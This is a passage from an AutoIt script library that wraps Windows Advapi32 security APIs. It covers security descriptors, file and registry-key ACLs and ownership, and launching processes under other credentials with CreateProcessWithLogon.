			"ptr", $pDacl, "int", $fDefault)
	Return SetError(_GetLastError(), 0, $iResult[0] <> 0)
EndFunc	;==>_SetSecurityDescriptorDacl

; #### FUNCTION ####
; =======================================================================
; Name	: _SetSecurityDescriptorSacl
; Description	: Sets information in a system access control list (SACL).
; Parameters	: $pSecurDesc	- A pointer to a SD Structure.
;		: $pSacl		- A pointer to a SACL.
;		: $fPresent	- A BOOL value indicates the presence of a SACL in the security descriptor.
;		: $fDefault	- A BOOL value indicates the source of the SACL.
; Return values	: True indicates success, else false.
; Author		: Pusofalse
; =======================================================================
Func _SetSecurityDescriptorSacl($pSecurDesc, $pSacl, $fPresent = True, $fDefault = True)
	Local $iResult
	If $fPresent = Default Then $fPresent = True
	If $fDefault = Default Then $fDefault = True
	If $pSacl And Not _IsValidAcl($pSacl) Then Return SetError(@error, 0, 0)
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, 0)
	$iResult = DllCall("Advapi32.dll", "int", "SetSecurityDescriptorSacl", _
			"ptr", $pSecurDesc, "int", $fPresent, _
			"ptr", $pSacl, "int", $fDefault)
	Return SetError(_GetLastError(), 0, $iResult[0] <> 0)
EndFunc	;==>_SetSecurityDescriptorSacl

; #### FUNCTION
; =======================================================================
; Name	: _SetSecurityDescriptorGroup
; Description	: Sets the primary group information of an absolute-format security descriptor.
; Parameter(s)	: $pSecurDesc	- A pointer to a SD structure.
;		: $pGroup		- A pointer to a SID contains the security descriptor's new primary group.
;		: $fDefault	- A BOOL value indicates whether the primary group information was derived from a default mechanism.
; Return values	: True indicates success, else returns False.
; Author		: Pusofalse
; =======================================================================
Func _SetSecurityDescriptorGroup($pSecurDesc, $pGroup, $fDefault = True)
	Local $iResult

	If $pGroup And Not _IsValidSid($pGroup) Then Return SetError(@error, 0, 0)
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, 0)
	$iResult = DllCall("Advapi32.dll", "int", "SetSecurityDescriptorGroup", _
			"ptr", $pSecurDesc, "ptr", $pGroup, "int", $fDefault)
	Return SetError(_GetLastError(), 0, $iResult[0] <> 0)
EndFunc	;==>_SetSecurityDescriptorGroup

; #### FUNCTION ####
; =======================================================================
; Name	: _GetSecurityDescriptorLength
; Description	: Retrieves the length of a security descriptor.
; Parameter(s)	: $pSecurDesc	- A pointer to a security descriptor
; Return values	: If succeeds, returns the length of the $pSecurDesc, else returns zero and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _GetSecurityDescriptorLength($pSecurDesc)
	Local $iLength
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, 0)
	$iLength = DllCall("Advapi32.dll", "dword", "GetSecurityDescriptorLength", "ptr", $pSecurDesc)
	Return SetError(_GetLastError(), 0, $iLength[0])
EndFunc	;==>_GetSecurityDescriptorLength

; #### FUNCTION ####
; =======================================================================
; Name	: _MakeSelfRelativeSD
; Description	: The function creates a security descriptor in self-relative format by using a security descriptor in absolute format as a template.
; Parameter(s)	: $pAbsoluteSd	- A pointer to a security descriptor in absoluted format. The function creates a version of this security descriptor in self-relative format without modifying the original.
; Return values	: If succeeds, returns a pointer to a newly created self-relateive security descriptor, @extended is set to the length of the security descriptor. If fails, returns zero and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _MakeSelfRelativeSD($pAbsoluteSd)
	Local $iResult, $pSRSd

	If Not _IsValidSecurityDescriptor($pAbsoluteSd) Then Return SetError(@error, 0, 0)
	$iResult = DllCall("Advapi32.dll", "int", "MakeSelfRelativeSD", _
			"ptr", $pAbsoluteSd, "ptr", 0, "int*", 0)
	$pSRSd = _HeapAlloc($iResult[3])
	$iResult = DllCall("Advapi32.dll", "int", "MakeSelfRelativeSD", _
			"ptr", $pAbsoluteSd, "ptr", $pSRSd, "int*", $iResult[3])
	Return SetError(_GetLastError(), $iResult[3], $pSRSd)
EndFunc	;==>_MakeSelfRelativeSd

; #### FUNCTION ####
; =======================================================================
; Name	: _MakeAbsoluteSD
; Description	: This function creates a security descriptor in absolute format, by using a security descriptor in self-relative format as a template.
; Parameter(s)	: $pSRSd	- A pointer to a securiy descriptor in self-relative format.
; Return values	: Returns an array in the following form:
;		: - $aArray[0]	- The exit code of the function, non-zero indicates success.
;		: - $aArray[1]	- The pointer to the security descriptor, same to $pSDSd parameter.
;		: - $aArray[2]	- A pointer to a security descriptor in absolute format.
;		: - $aArray[3]	- The length of the absolute-format security descriptor ($aArray[2]).
;		: - $aArray[4]	- A pointer to a discretionary access control list (DACL) of the absolute-format security descriptor.
;		: - $aArray[5]	- The length of the DACL ($aArray[4]).
;		: - $aArray[6]	- A pointer to a system access control list (SACL) of the absolute-format security descriptor.
;		: - $aArray[7]	- The length of the SACL ($aArray[6]).
;		: - $aArray[8]	- A pointer to a SID of the owner of the absolute-format security descriptor.
;		: - $aArray[9]	- The length of the SID of the owner ($aArray[8]).
;		: - $aArray[10]	- A pointer to a SID of the primary group of the absolute-format security descriptor.
;		: - $aArray[11]	- The length of the SID of the primary group ($aArray[10]).
; Author	: Pusofalse
; Remarks	: When you no longer use these returned pointers, call _HeapFree function to free them. It's caller's responsibility.
; =======================================================================
Func _MakeAbsoluteSD($pSRSd)
	Local $iResult, $pABSd, $pDacl, $pSacl, $pOwner, $pGroup, $aResult[11]

	If Not _IsValidSecurityDescriptor($pSRSd) Then Return SetError(@error, 0, $aResult)
	$iResult = DllCall("Advapi32.dll", "int", "MakeAbsoluteSD", "ptr", $pSRSd, _
			"ptr", 0, "int*", 0, "ptr", 0, "int*", 0, _
			"ptr", 0, "int*", 0, "ptr", 0, "int*", 0, "ptr", 0, "int*", 0)
	$pABSd = _HeapAlloc($iResult[3])
	$pDacl = _HeapAlloc($iResult[5])
	$pSacl = _HeapAlloc($iResult[7])
	$pOwner = _HeapAlloc($iResult[9])
	$pGroup = _HeapAlloc($iResult[11])
	$iResult = DllCall("Advapi32.dll", "int", "MakeAbsoluteSD", "ptr", $pSRSd, _
			"ptr", $pABSd, "int*", $iResult[3], "ptr", $pDacl, "int*", $iResult[5], _
			"ptr", $pSacl, "int*", $iResult[7], "ptr", $pOwner, "int*", $iResult[9], _
			"ptr", $pGroup, "int*", $iResult[11])
	Return SetError(_GetLastError(), $iResult[0], $iResult)
EndFunc	;==>_MakeAbsoluteSD

; #### FUNCTION ####
; =======================================================================
; Name	: _ConvertSdToStringSd
; Description	: This function converts a security descriptor to string format.
; Parameter(s)	: $pSecurDesc	- A pointer to a security descriptor.
; Return values	: If succeeds, returns a string contains the security desciptor, else returns empty.
; Author	: Pusofalse
; =======================================================================
Func _ConvertSdToStringSd($pSecurDesc)
	Local $iResult, $tBuffer, $iMask = 15, $sResult
	Local $sFunction = "ConvertSecurityDescriptorToStringSecurityDescriptor"

	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, "")
	$iResult = DllCall("Advapi32.dll", "int", $sFunction, "ptr", $pSecurDesc, "dword", 1, _
			"dword", $iMask, "ptr*", 0, "int*", 0)
	$tBuffer = DllStructCreate("char[" & $iResult[5] & "]", $iResult[4])
	$sResult = DllStructGetData($tBuffer, 1)
	_LsaLocalFree($iResult[4])
	Return SetExtended(_FreeVariable($tBuffer), $sResult)
EndFunc	;==>_ConvertSdToStringSD

; #### FUNCTION ####
; =======================================================================
; Name	: _ConvertStringSdToSd
; Description	: Converts a security descriptor string to a security descriptor pointer.
; Parameter(s)	: $sSecurDesc	- A string contains the security descriptor.
;		: $fMakeAbsolute	- If true, the function makes an absolute-format security descriptor, default to false.
; Return values	: If succeeds, the return value is a pointer to a security descriptor.
; Author	: Pusofalse
; Remarks	: When you finished with the pointer, call _LsaLocalFree function to free it.
; =======================================================================
Func _ConvertStringSdToSd($sSecurDesc, $fMakeAbsolute = false)
	Local $iResult, $sFunction
	$sFunction = "ConvertStringSecurityDescriptorToSecurityDescriptor"
	$iResult = DllCall("Advapi32.dll", "int", $sFunction, "str", $sSecurDesc, _
			"dword", 1, "ptr*", 0, "ulong*", 0)
	If Not $iResult[3] Then Return SetError(_GetLastError(), 0, 0)
	If $fMakeAbsolute = True Then
		$pAbSd = _MakeAbsoluteSD($iResult[3])
		Return SetError(@error, $pAbSd[3], $pAbSD[2])
	Else
		Return SetError(_GetLastError(), $iResult[4], $iResult[3])
	EndIf
EndFunc	;==>_ConvertStringSdToSD

; #### FUNCTION ####
; =======================================================================
; Name	: _QueryFileSecurity
; Description	: Retrieves the security descriptor of the specified file.
; Parameter(s)	: $sFile	- File the security descriptor from which is retrieved.
;		: $iSecurLevel	- SECURITY INFORMATION CONSTANTS value(s).
; Return values	: If succeeds, the return value is a pointer to a security descriptor of the specified file.
; Author	: Pusofalse
; Remarks	: Note that the $sFile must be in NTFS file system, else, the function fails with ERROR_ACCESS_DENIED.
; =======================================================================
Func _QueryFileSecurity($sFile, $iSecurLevel = 4)
	Local $iResult, $pSecurDesc

	If Not _IsNtfs($sFile) Then Return SetError(@error, 0, 0)
	$iResult = DllCall("Advapi32.dll", "int", "GetFileSecurity", _
			"str", $sFile, "int", $iSecurLevel, "ptr", 0, _
			"dword", 0, "dword*", 0)
	$pSecurDesc = _HeapAlloc($iResult[5])
	$iResult = DllCall("Advapi32.dll", "int", "GetFileSecurity", _
			"str", $sFile, "int", $iSecurLevel, "ptr", $pSecurDesc, _
			"dword", $iResult[5], "dword*", 0)
	Return SetError(_GetLastError(), 0, $pSecurDesc)
EndFunc	;==>_QueryFileSecurity

; #### FUNCTION ####
; =======================================================================
; Name	: _QueryFileSecurityOwner
; Description	: This function retrieves the owner information of the specified file.
; Parameter(s)	: $sFile	- The file on which the owner information is retrieved.
; Return values	: If succeeds, returns the owner of the file (in string format), else returns NULL.
; Author	: Pusofalse
; Remarks		: $sFile parameter must be in the NTFS file system, else returns NULL, and sets @error to ERROR_ACCESS_DENIED (5).
; =======================================================================
Func _QueryFileSecurityOwner($sFile)
	Local $pSecurDesc, $pOwner, $fDefault, $iSysError, $sOwner

	If Not _IsNtfs($sFile) Then Return SetError(@error, 0, "")
	$pSecurDesc = _QueryFileSecurity($sFile, 1)
	$pOwner = _GetSecurityDescriptorOwner($pSecurDesc)
	$fDefault = @Extended
	$iSysError = @ERROR
	$sOwner = _LookupAccountSid($pOwner)
	_HeapFree($pSecurDesc)
	Return SetError($iSysError, $fDefault, $sOwner)
EndFunc	;==>_QueryFileSecurityOwner

; #### FUNCTION ####
; =======================================================================
; Name	: _QueryFileSecurityDacl
; Description	: Retrieves the DACL information for a file object.
; Parameter(s)	: $sFile	- File name.
; Return values	: The return value is same to the result of the _GetExplicitEntriesFromAcl function.
; Author	: Pusofalse
; =======================================================================
Func _QueryFileSecurityDacl($sFile)
	Local $pSecurDesc, $pDacl, $fDefault, $aResult[1][5] = [[0]], $aAceList, $iSysError

	If Not _IsNtfs($sFile) Then Return SetError(@error, 0, $aResult)
	$pSecurDesc = _QueryFileSecurity($sFile, 4)
	$iSysError = @error
	$pDacl = _GetSecurityDescriptorDacl($pSecurDesc)
	$fDefault = @Extended
	$aAceList = _GetExplicitEntriesFromAcl($pDacl)
	_HeapFree($pSecurDesc)
	Return SetError($iSysError, $fDefault, $aAceList)
EndFunc	;==>_QueryFileSecurityDacl

; #### FUNCTION ####
; =======================================================================
; Name	: _SetFileSecurity
; Description	: This function sets the security information for a file object.
; Parameter(s)	: $sFile	- File the security information to be set.
;		: $iSecurLevel	- SECURITY INFORMATION CONSTANTS.
;		: $pSecurDesc	- A pointer to a security descriptor contains the security information.
; Return values	: True indicates success, false to failure.
; Author	: Pusofalse
; =======================================================================
Func _SetFileSecurity($sFile, $iSecurLevel, $pSecurDesc)
	Local $iResult

	If Not _IsNtfs($sFile) Then Return SetError(@error, 0, 0)
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, 0)

	$iResult = DllCall("Advapi32.dll", "int", "SetFileSecurity", _
			"str", $sFile, "int", $iSecurLevel, "ptr", $pSecurDesc)
	Return SetError(_GetLastError(), 0, $iResult[0] <> 0)
EndFunc	;==>_SetFileSecurity

; #### FUNCTION ####
; =======================================================================
; Name	: _SetFileSecurityOwner
; Description	: This function sets the owner for a file.
; Parameter(s)	: $sFile	- File name.
;		: $sOwner	- Owner name, in string format.
; Return values	: True indicates success, false to failure, in which case, @error is set to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _SetFileSecurityOwner($sFile, $sOwner)
	Local $iResult, $iSysError, $pOwner, $pSecurDesc

	If Not _IsNtfs($sFile) Then Return SetError(@error, 0, 0)
	If $sOwner Then
		$pOwner = _LookupAccountName($sOwner)
		If Not _IsValidSid($pOwner) Then Return SetError(@error, 0, 0)
	EndIf
	$pSecurDesc = _InitializeSecurityDescriptor()
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, 0)
	If Not _SetSecurityDescriptorOwner($pSecurDesc, $pOwner) Then Return SetError(@error, 0, 0)
	$iResult = _SetFileSecurity($sFile, 1, $pSecurDesc)
	$iSysError = @error
	If $sOwner Then _HeapFree($pOwner)
	Return SetError($iSysError, _HeapFree($pSecurDesc), $iResult)
EndFunc	;==>_SetFileSecurityOwner

; #### FUNCTION ####
; =======================================================================
; Name	: _SetFileSecurityDacl
; Description	: This function is used to set the DACL security information for a file object.
; Parameter(s)	: $sFile	- The file name which the security information is set.
;		: $aAccess	- See _SetEntriesInAcl function for details.
;		: $pOldDacl	- A existing pointer to an access control list, can be zero.
; Return values	: If succeeds, returns true, else returns false.
; Author	: Pusofalse
; =======================================================================
Func _SetFileSecurityDacl($sFile, $aAccess, $pOldDacl = 0)
	Local $iResult, $pDacl, $pSecurDesc, $iSysError

	If Not _IsNtfs($sFile) Then Return SetError(@error, 0, 0)
	If IsArray($aAccess) Then
		$pDacl = _SetEntriesInAcl($aAccess, $pOldDacl)
	EndIf
	If $pDacl = 0 Then Return SetError(@error, 0, 0)
	If Not _IsValidAcl($pDacl) Then Return SetError(@error, 0, 0)
	$pSecurDesc = _InitializeSecurityDescriptor()
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, 0)
	If Not _SetSecurityDescriptorDacl($pSecurDesc, $pDacl) Then Return SetError(@error, 0, 0)
	$iResult = _SetFileSecurity($sFile, 4, $pSecurDesc)
	$iSysError = @error
	_LsaLocalFree($pDacl)
	Return SetError($iSysError, _HeapFree($pSecurDesc), $iResult)
EndFunc	;==>_SetFileSecurityDacl

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaMakeLong64
; Description	: Makes an int64 value by using double 4 bytes values.
; Parameter(s)	: $iLow	- The low order double word.
;		: $iHigh	- The high order double word.
; Return values	: An int64 value (8 bytes).
; Author	: Pusofalse
; =======================================================================
Func _LsaMakeLong64($iLow, $iHigh)
	Local $tDword, $pDword, $tLong64

	$tDword = DllStructCreate("dword;dword")
	$pDword = DllStructGetPtr($tDword)
	$tLong64 = DllStructCreate("int64", $pDword)
	DllStructSetData($tDword, 1, $iLow)
	DllStructSetData($tDword, 2, $iHigh)
	Return DllStructGetData($tLong64, 1)
EndFunc	;==>_LsaMakeLong64

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaLoLong64
; Description	: Obtains the low order double words from an int64 value.
; Parameters	: $iLong64	- An value with 8 bytes.
; Return values	: The value with double words, in lower order.
; Author	: Pusofalse
; =======================================================================
Func _LsaLoLong64($iLong64)
	Local $tLong64, $pLong64, $tDword

	$tLong64 = DllStructCreate("int64")
	$pLong64 = DllStructGetPtr($tLong64)
	$tDword = DllStructCreate("dword;dword", $pLong64)
	DllStructSetData($tLong64, 1, $iLong64)
	Return DllStructGetData($tDword, 1)
EndFunc	;==>_LsaLoLong64

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaHiLong64
; Description	: Obtains the high order double words from an 8 bytes (int64) value.
; Parameter(s)	: $iLong64 - A value with 8 bytes.
; Return values	: A DWORD value (4 bytes), in high order, of the $iLong64.
; Author	: Pusofalse
; =======================================================================
Func _LsaHiLong64($iLong64)
	Local $tLong64, $pLong64, $tDword

	$tLong64 = DllStructCreate("int64")
	$pLong64 = DllStructGetPtr($tLong64)
	$tDword = DllStructCreate("dword;dword", $pLong64)
	DllStructSetData($tLong64, 1, $iLong64)
	Return DllStructGetData($tDword, 2)
EndFunc	;==>_LsaHiLong64

; #### FUNCTION ####
; =======================================================================
; Name	: _CreateProcessWithLogon
; Description	: Creates a new process and its primary thread. Then the new process runs the specified executable file in the security context of the specified credentials (user, domain, and password). It can optionally load the user profile for a specified user.
; Parameter(s)	: $sUser	- The name of the user. This is the name of the user account to log on to. If you use the UPN format, user@DNS_domain_name, the $sDomain parameter must be NULL. The user account must have the Log On Locally permission on the local computer. This permission is granted to all users on workstations and servers, but only to administrators on domain controllers. 
;		: $sPswd	- The clear-text password for the $sUser user account.
;		: $sDomain	- The name of the domain or server whose account database contains the $sUser account. If this parameter is NULL, the user name must be specified in UPN format. 
;		: $sApp	- The application to execute.
;		: $sArg	- Arguments pass to the $sApp, if no arguments, this parameter can be NULL.
;		: $hProcess	- A variable receives the handle to the new process.
;		: $hThread	- A variable receives the handle to the new process's primary thread.
;		: $iCreation	- A value indicates the priority class of the new process, default to NORMAL PRIORITY.
;		: $sWorkingDir	- Specifies the working directory, if NULL or empty string specified, the path of $sApp is used.
;		: $iState	- Initial state, see @SW_* macros for a possible value, default to @SW_SHOWNORMAL.
; Return values	: If succeeds, the return value is the identifier of the newly created process, $hProcess and $hThread parameters receive the handle to the new process and its primary thread, when you no longer use the handle, call _LsaCloseHandle function to close them. If fails, the return value is set to zero, and @error is set to a system error code, pass to FormatMessage API function for an explicit error message.
; Author	: Pusofalse
; =======================================================================
Func _CreateProcessWithLogon($sUser, $sPswd, $sDomain, $sApp, $sArg, ByRef $hProcess, ByRef $hThread, $iCreation = 0x20, $sWorkingDir = "", $iState = -1)
	Local $tStp, $pStp, $tWD, $pWD, $tPS, $pPS, $iResult, $iSysError, $iPid, $vNul, $iMask = 4

	$tPS = DllStructCreate("hWnd[2];dword[2]")
	$pPS = DllStructGetPtr($tPS)

	If $iState <> -1 Then $iMask = bitOR($iMask, 1)
	$tStp = DllStructCreate("dword;ptr[3];dword[8];short[2];ptr;hWnd[3]")
	$pStp = DllStructGetPtr($tStp)
	DllStructSetData($tStp, 1, DllStructGetSize($tStp))
	DllStructSetData($tStp, 3, $iMask, 8)
	DllStructSetData($tStp, 3, 77, 1)
	DllStructSetData($tStp, 3, 77, 2)
	If $iState <> -1 Then DllStructSetData($tStp, 4, $iState, 1)

	If $sWorkingDir And FileExists($sWorkingDir) Then
		$tWD = DllStructCreate("wchar[" & StringLen($sWorkingDir) + 2 & "]")
		$pWD = DllStructGetPtr($tWD)
		DllStructSetData($tWD, 1, $sWorkingDir)
	EndIf

	If $iCreation = Default Then $iCreation = 0x20
	$iResult = DllCall("Advapi32.dll", "int", "CreateProcessWithLogonW", _
			"wstr", $sUser, "wstr", $sDomain, "wstr", $sPswd, _
			"dword", 1, "wstr", $sApp, "wstr", $sArg, _
			"dword", $iCreation, "ptr", 0, "ptr", $pWD, _
			"ptr", $pStp, "ptr", $pPS)
	$iSysError = _GetLastError()
	$iPid = DllStructGetData($tPS, 2, 1)
	$hProcess = DllStructGetData($tPS, 1, 1)
	$hThread = DllStructGetData($tPS, 1, 2)
	$vNul = _FreeVariable($tPS) And _FreeVariable($tSTP) And _FreeVariable($tWD)
	Return SetError($iSysError, $iResult[0], $iPid)
EndFunc	;==>_CreateProcessWithLogon

; #### FUNCTION ####
; =======================================================================
; This function is internal used to open a registry key and retrieve its handle.
; =======================================================================
Func _RegOpenKeyEx($hMainKey, $sSubKey, $iAccess)
	Local $iResult
	$iResult = DllCall("Advapi32.dll", "long", "RegOpenKeyEx", _
			"hWnd", $hMainKey, "str", $sSubKey, _
			"dword", 0, "long", $iAccess, "hWnd*", 0)
	Return SetError($iResult[0], 0, $iResult[5])
EndFunc	;==>_RegOpenKeyEx

; #### FUNCTION ####
; =======================================================================
; The function is internal used to close the handle to the registry key opened by the previous call to _RegOpenKeyEx function.
; =======================================================================
Func _RegCloseKey($hKey)
	Local $iResult = DllCall("Advapi32.dll", "long", "RegCloseKey", "hWnd", $hKey)
	Return SetError($iResult[0], 0, $iResult[0] = 0)
EndFunc	;==>_RegCloseKey

; #### FUNCTION ####
; =======================================================================
; Name	: _RegSetKeySecurity
; Description	: This function sets the security of the registry key.
; Parameter(s)	: $hMainKey	- A handle to the predefined key, see HKEY_* constants (defined in constants.au3) for a value.
;		: $sSubKey	- A string contains the sub-key name.
;		: $iSecurLevel	- Security information to be set.
;		: $pSecurDesc	- A pointer to a security descriptor.
; Return values	: True indicates success, false to failure, in which case, @error is set to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _RegSetKeySecurity($hMainKey, $sSubKey, $iSecurLevel, $pSecurDesc)
	Local $hKey, $hToken, $iAccessMask = $WRITE_DAC, $v_Null

	If bitAND($iSecurLevel, $OWNER_SECURITY_INFORMATION) Then
		Local $aPriv[1][2] = [[$SE_RESTORE_NAME, 2]]
		$hToken = _OpenProcessToken(-1)
		_AdjustTokenPrivileges($hToken, $aPriv)
		$v_Null = _FreeVariable($aPriv) And _LsaCloseHandle($hToken)
		$iAccessMask = bitOR($iAccessMask, $WRITE_OWNER)
	EndIf
	If bitAND($iSecurLevel, $SACL_SECURITY_INFORMATION) Then
		Local $aPriv[1][2] = [[$SE_SECURITY_NAME, 2]]
		$hToken = _OpenProcessToken(-1)
		_AdjustTokenPrivileges($hToken, $aPriv)
		$v_Null = _FreeVariable($aPriv) And _LsaCloseHandle($hToken)
		$iAccessMask = bitOR($iAccessMask, $ACCESS_SYSTEM_SECURITY)
	EndIf
	$hKey = _RegOpenKeyEx($hMainKey, $sSubKey, $iAccessMask)
	If Not $hKey Then Return SetError(@error, 0, 0)

	$iResult = DllCall("Advapi32.dll", "long", "RegSetKeySecurity", _
			"hWnd", $hKey, "int", $iSecurLevel, "ptr", $pSecurDesc)
	_RegCloseKey($hKey)
	Return SetError($iResult[0], 0, $iResult[0] = 0)
EndFunc	;==>_RegSetKeySecurity

; #### FUNCTION ####
; =======================================================================
; Name	: _RegSetKeySecurityDacl
; Description	: The function sets the access rights for a registry key.
; Parameter(s)	: $hMainKey	- A handle to the registry main key, predefined in constants.au3, prefix - HKEY_*.
;		: $sSubKey	- A string contains the sub key name.
;		: $aAccess	- See _SetEntriesInAcl function for the format of the this parameter.
;		: $pOldAcl	- A pointer to an existing access control list, can be zero.
; Return values	: If succeeds, returns true, else returns false, and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _RegSetKeySecurityDacl($hMainKey, $sSubKey, $aAccess, $pOldAcl = 0)
	Local $pNewAcl, $iResult, $iSysError

	$pNewAcl = _SetEntriesInAcl($aAccess, $pOldAcl)
	If Not _IsValidAcl($pNewAcl) Then Return SetError(@error, 0, 0)
	$pSecurDesc = _InitializeSecurityDescriptor()
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, 0)
	If Not _SetSecurityDescriptorDacl($pSecurDesc, $pNewAcl) Then
		Return SetError(@error, 0, 0)
	EndIf
	$iResult = _RegSetKeySecurity($hMainKey, $sSubKey, 4, $pSecurDesc)
	$iSysError = @error
	_HeapFree($pSecurDesc)
	_LsaLocalFree($pNewAcl)
	Return SetError($iSysError, 0, $iSysError = 0)
EndFunc	;==>_RegSetKeySecurityDacl

; #### FUNCTION ####
; =======================================================================
; Name	: _RegSetKeySecurityOwner
; Description	: This function is used to set the owner of the registry key.
; Parameter(s)	: $hMainKey	- A handle to the registry main key.
;		: $sSubKey	- Sub key name.
;		: $sOwner		- Owner of the registry key, in string format.
; Return values	: Returns true if succeeds, else returns false and sets @error.
; Author	: Pusofalse
; =======================================================================
Func _RegSetKeySecurityOwner($hMainKey, $sSubKey, $sOwner)
	Local $pSid, $iResult, $iSysError, $pSecurDesc, $v_Null

	$pSid = _LookupAccountName($sOwner)
	If Not _IsValidSid($pSid) Then Return SetError(@error, 0, 0)
	$pSecurDesc = _InitializeSecurityDescriptor()
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, 0)
	If Not _SetSecurityDescriptorOwner($pSecurDesc, $pSid) Then
		Return SetError(@error, 0, 0)
	EndIf
	$iResult = _RegSetKeySecurity($hMainKey, $sSubKey, 1, $pSecurDesc)
	$iSysError = @error
	$v_Null = _HeapFree($pSid) And _HeapFree($pSecurDesc)
	Return SetError($iSysError, 0, $iSysError = 0)
EndFunc	;==>_RegSetKeySecurityOwner

; #### FUNCTION ####
; =======================================================================
; Name	: _RegGetKeySecurity
; Description	: This function retrieves the security information of the registry key.
; Parameter(s)	: $hMainKey	- The handle to the registry main key.
;		: $sSubKey	- A string contains the sub key name.
;		: $iSecurLevel	- Security information to retrieve.
; Return values	: If succeeds, returns a pointer to a security descriptor, if fails, @error is set to non-zero.
; Author	: Pusofalse
; =======================================================================
Func _RegGetKeySecurity($hMainKey, $sSubKey, $iSecurLevel = 4)
	Local $iResult, $iAccessMask = $READ_CONTROL, $v_Null, $pSecurDesc, $hKey

	If bitAND($iSecurLevel, $SACL_SECURITY_INFORMATION) Then
		Local $aPriv[1][2] = [[$SE_SECURITY_NAME, 2]], $hToken
		$iAccessMask = bitOR($iAccessMask, $ACCESS_SYSTEM_SECURITY)
		$hToken = _OpenProcessToken(-1)
		_AdjustTokenPrivileges($hToken, $aPriv)
		$v_Null = _LsaCloseHandle($hToken) And _FreeVariable($aPriv)
	EndIf

	$hKey = _RegOpenKeyEx($hMainKey, $sSubKey, $iAccessMask)
	If Not $hKey Then Return SetError(@error, 0, 0)

	$iResult = DllCall("Advapi32.dll", "long", "RegGetKeySecurity", _
			"hWnd", $hKey, "int", $iSecurLevel, _
			"ptr", 0, "dword*", 0)
	$pSecurDesc = _HeapAlloc($iResult[4])
	$iResult = DllCall("Advapi32.dll", "long", "RegGetKeySecurity", _
			"hWnd", $hKey, "int", $iSecurLevel, _
			"ptr", $pSecurDesc, "dword*", $iResult[4])
	_RegCloseKey($hKey)
	Return SetError($iResult[0], 0, $pSecurDesc)
EndFunc	;==>_RegGetKeySecurity

; #### FUNCTION ####
; =======================================================================
; Name	: _RegGetKeySecurityOwner
; Description	: Retrieves the owner of the registry key.
; Parameter(s)	: $hMainKey	- A value of predefined handle to the registry key.
;		: $sSubKey	- Sub key name.
; Return values	: If succeeds, returns a string contains the owner name, if fails, @error is set to a system error code.
; =======================================================================
Func _RegGetKeySecurityOwner($hMainKey, $sSubKey)
	Local $pOwner, $sOwner, $pSecurDesc, $iSysError

	$pSecurDesc = _RegGetKeySecurity($hMainKey, $sSubKey, $OWNER_SECURITY_INFORMATION)
	$iSysError = @error
	$pOwner = _GetSecurityDescriptorOwner($pSecurDesc)
	$sOwner = _LookupAccountSid($pOwner)
	Return SetError($iSysError, _HeapFree($pSecurDesc), $sOwner)
EndFunc	;==>_RegGetKeySecurityOwner

; <-- inheritance question
; #### FUNCTION ####
; =======================================================================
; Name	: _RegGetKeySecurityDacl
; Description	: This function retrieves an array that contains the access rights of the specified registry key.
; Parameter(s)	: $hMainKey	- A predefined value to the registry main key.
;		: $fRecur	- A BOOL value indicates the recursion of the registry keys, see Remarks section for defails.
; Return values	: If succeeds, the format of the return value is same to _GetExplicitEntriesFromAcl's.
; Author	: Pusofalse
; Remarks	: If $fRecur parameter is false, the function does not work on keys which have the inheritance options, for example: _RegGetKeySecurityDacl(0x80000002, "SOFTWARE\Test", false), If the access rights of the key of Test is inherited from SOFTWARE parent key, the function does not work well, in this case, set $fRecur to True, then re-call the function, the function retrieves the access rights of the SOFTWARE key, @extended is a pointer to a NULL-terminated string that contains the actual key name from which the access rights is retrieved. _GetNamedSecurityInfo and _GetSecurityInfo functions can also return the access rights of a registry key object, but does not return the access rights of the key has inheritance options too.
; =======================================================================
Func _RegGetKeySecurityDacl($hMainKey, $sSubKey, $fRecur = false)
	Local $iResult, $pSecurDesc, $iSysError, $aAceList[1][5] = [[0]], $aSubKey

	$sSubKey = StringRegExpReplace($sSubKey, "\\+", "\\")
	$pSecurDesc = _RegGetKeySecurity($hMainKey, $sSubKey, 4)
	$iSysError = @error
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError($iSysError, 0, $aAceList)
	$pDacl = _GetSecurityDescriptorDacl($pSecurDesc)
	$iSysError = @error
	If Not _IsValidAcl($pDacl) Then Return SetError($iSysError, 0, $aAceList)
	$aAceList = _GetExplicitEntriesFromAcl($pDacl)
	_HeapFree($pSecurDesc)
	If $aAceList[0][0] = 0 AND $fRecur = True Then
		$aSubKey = StringSplit($sSubKey, "\")
		$sSubKey = ""
		For $i = 1 to $aSubKey[0] - 1
			$sSubKey &= $aSubKey[$i] & "\"
		Next
		$sSubKey = StringTrimRight($sSubKey, 1)
		$aAceList = _RegGetKeySecurityDacl($hMainKey, $sSubKey, 1)
		Return SetExtended(@extended, $aAceList)
	Else
		Local $pKeyAddr, $tKeyAddr
		$pKeyAddr = _HeapAlloc(StringLen($sSubKey) * 2 + 2)
		$tKeyAddr = DllStructCreate("wchar[" & StringLen($sSubKey) * 2 + 2 & "]", $pKeyAddr)
		DllStructSetData($tKeyAddr, 1, $sSubKey)
		Return SetExtended($pKeyAddr, $aAceList)
	EndIf
EndFunc	;==>_RegGetKeySecurityDacl

; #### FUNCTION ####
; =======================================================================
; Name	: _RegGetKeySecuritySacl
; Description	: Retrieves the system access control list (SACL) of the specified registry key.
; Parameter(s)	: $hMainKey	- A value of predefined handle to the registry main key.
;		: $sSubKey	- Sub key name.
; Return values	: The format of the return value is same to the _RegGetKeySecurityDacl function.
; Author	: Pusofalse
; =======================================================================
